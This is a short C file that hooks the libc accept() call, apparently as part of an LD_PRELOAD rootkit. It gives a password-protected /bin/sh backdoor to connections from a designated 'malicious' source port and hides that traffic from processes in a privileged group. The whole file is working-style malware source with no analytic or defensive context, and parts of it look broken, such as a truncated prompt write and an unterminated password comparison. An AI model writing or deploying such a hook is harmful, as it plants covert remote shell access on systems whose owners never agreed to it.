#include "utils.h"
int (*original_accept)(int, struct sockaddr *, socklen_t *);
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    original_accept = dlsym(RTLD_NEXT, "accept");
    char pw[32];
    struct sockaddr_in *socket_accept = (struct sockaddr_in *) addr;
    int aut_sock = original_accept(sockfd, addr, addrlen);
    pid_t pid;

    if (getegid() == ESCALATED_GID)
        return original_accept(sockfd, addr, addrlen);

    if(htons(socket_accept->sin_port) == MALICIOUS_PORT){
        pid = fork();
        if(pid == 0){
            write(aut_sock, "\n\nPW?: ", 4);
            read(aut_sock, pw, 32);

            if(!strcmp(pw,SHELL_PW)){
                execl("/bin/sh", "/bin/sh", (char *)NULL);
            }
        }

        else {
            errno = ECONNABORTED;
            return -1;
        }
    }


    return aut_sock;
}